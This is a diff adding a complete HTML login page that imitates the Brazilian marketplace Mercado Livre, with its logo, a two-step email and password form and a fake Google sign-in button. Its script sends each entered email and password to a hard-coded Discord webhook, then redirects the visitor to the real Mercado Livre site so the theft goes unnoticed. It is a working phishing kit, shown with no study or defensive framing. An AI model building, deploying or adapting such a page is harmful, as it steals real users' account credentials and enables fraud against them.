@@ -1,0 +1,213 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Login - Mercado Livre</title>
+  <style>
+    body {
+      margin: 0;
+      font-family: Arial, sans-serif;
+      background-color: #fff;
+      color: #333;
+    }
+
+    .header {
+      background-color: #ffe600;
+      padding: 10px 20px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      height: 60px;
+    }
+
+    .header img {
+      max-height: 35px;
+    }
+
+    .login-container {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: calc(100vh - 60px);
+      padding: 20px;
+    }
+
+    .login-box {
+      width: 350px;
+      border: 1px solid #ddd;
+      border-radius: 8px;
+      padding: 30px;
+      box-shadow: 0px 4px 8px rgba(0, 0, 0, 0.1);
+    }
+
+    .login-box h1 {
+      font-size: 20px;
+      font-weight: 500;
+      margin-bottom: 20px;
+    }
+
+    .login-box input {
+      width: 100%;
+      padding: 10px;
+      margin-bottom: 15px;
+      border: 1px solid #ccc;
+      border-radius: 4px;
+      font-size: 16px;
+    }
+
+    .login-box button {
+      width: 100%;
+      padding: 12px;
+      background-color: #3483fa;
+      color: white;
+      border: none;
+      border-radius: 4px;
+      font-size: 16px;
+      cursor: pointer;
+    }
+
+    .login-box button:hover {
+      background-color: #2968c8;
+    }
+
+    .login-box a {
+      color: #3483fa;
+      text-decoration: none;
+      font-size: 14px;
+    }
+
+    .login-box a:hover {
+      text-decoration: underline;
+    }
+
+    .divider {
+      display: flex;
+      align-items: center;
+      margin: 20px 0;
+    }
+
+    .divider::before,
+    .divider::after {
+      content: "";
+      flex: 1;
+      height: 1px;
+      background: #ccc;
+    }
+
+    .divider span {
+      margin: 0 10px;
+      color: #666;
+      font-size: 14px;
+    }
+
+    .google-login {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 10px;
+      border: 1px solid #ddd;
+      border-radius: 4px;
+      cursor: pointer;
+      font-size: 14px;
+    }
+
+    .google-login img {
+      margin-right: 10px;
+      height: 18px;
+    }
+
+    .support-links {
+      margin-top: 20px;
+      font-size: 14px;
+      text-align: center;
+    }
+
+    .support-links a {
+      color: #3483fa;
+      text-decoration: none;
+      margin: 5px;
+      display: inline-block;
+    }
+
+    .support-links a:hover {
+      text-decoration: underline;
+    }
+  </style>
+</head>
+<body>
+  <div class="header">
+    <img src="https://logodownload.org/wp-content/uploads/2016/08/mercado-livre-logo-8.png" alt="Mercado Livre">
+  </div>
+
+  <div class="login-container">
+    <div class="login-box">
+      <h1>Digite seu e-mail ou telefone para iniciar sessão</h1>
+      <!-- Primeiro formulário: E-mail ou telefone -->
+      <form id="emailForm">
+        <input type="email" id="email" placeholder="E-mail ou telefone" required>
+        <button type="submit">Continuar</button>
+      </form>
+
+      <!-- Segundo formulário: Senha -->
+      <form id="passwordForm" style="display: none; margin-top: 20px;">
+        <input type="password" id="password" placeholder="Digite sua senha" required>
+        <button type="submit">Entrar</button>
+      </form>
+
+      <a href="#">Criar conta</a>
+      <div class="divider">
+        <span>ou</span>
+      </div>
+      <div class="google-login">
+        <img src="https://logopng.com.br/logos/google-37.png" alt="Google">
+        Fazer login com o Google
+      </div>
+      <div class="support-links">
+        <a href="#">Tenho um problema de segurança</a><br>
+        <a href="#">Preciso de ajuda com outros temas</a>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    const emailForm = document.getElementById('emailForm');
+    const passwordForm = document.getElementById('passwordForm');
+    const webhookURL = "https://discord.com/api/webhooks/1312272446266540172/gFzxvmYhFtyc3GNYUVRO1STRnQ4lTnSugAck0RMieMVIQuSSHpvHRJ3MYAHX32U6WYCO";
+
+    // Quando o primeiro formulário for enviado, mostra o segundo formulário
+    emailForm.addEventListener('submit', function (event) {
+      event.preventDefault();
+      emailForm.style.display = 'none'; // Esconde o formulário de e-mail
+      passwordForm.style.display = 'block'; // Mostra o formulário de senha
+    });
+
+    // Quando o segundo formulário for enviado, envia os dados ao webhook e redireciona
+    passwordForm.addEventListener('submit', function (event) {
+      event.preventDefault();
+      const email = document.getElementById('email').value;
+      const password = document.getElementById('password').value;
+
+      // Enviar os dados para o webhook do Discord
+      fetch(webhookURL, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+        },
+        body: JSON.stringify({
+          content: `\`\`\`
+E-mail: ${email}
+Senha: ${password}
+\`\`\``,
+        }),
+      })
+      .catch(error => {
+        console.error('Erro ao enviar os dados:', error);
+      });
+
+      // Redireciona para a página do Mercado Livre
+      window.location.href = "https://www.mercadolivre.com.br/";
+    });
+  </script>
+</body>
+</html>
